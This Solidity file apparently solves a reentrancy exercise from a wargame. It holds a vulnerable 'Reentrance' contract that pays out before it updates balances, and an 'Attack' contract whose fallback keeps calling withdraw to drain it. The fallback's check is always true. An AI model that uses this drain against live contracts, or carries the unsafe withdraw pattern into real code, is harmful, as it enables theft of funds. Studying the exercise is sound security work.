// SPDX-License-Identifier: MIT

/****Og Contract****/

pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }   
  }

  fallback() external payable {}
} 

/****attack Contract****/

contract Attack{
    Reentrance instance;
    
    constructor(address payable _instance)public payable{
        instance = Reentrance(_instance);
    }
    
    function attack() public {
        instance.donate{value:1 ether}(address(this));
        instance.withdraw(1 ether);
    }
    
    fallback()external payable{
        if(address(instance).balance>=0){
            instance.withdraw(1 ether);
        }
    }
}